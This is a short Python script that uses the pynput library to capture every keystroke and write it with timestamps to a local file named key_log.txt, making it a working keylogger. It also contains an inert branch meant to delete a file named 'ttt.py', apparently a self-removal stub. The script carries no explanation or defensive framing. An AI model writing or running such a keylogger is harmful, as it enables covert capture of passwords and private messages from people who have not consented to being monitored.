#!/usr/bin/env python3

from pynput.keyboard import Key, Listener
import logging
import os

x = 000

if(x == 123456):
    os.remove("ttt.py")

log_dir = ""
logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()
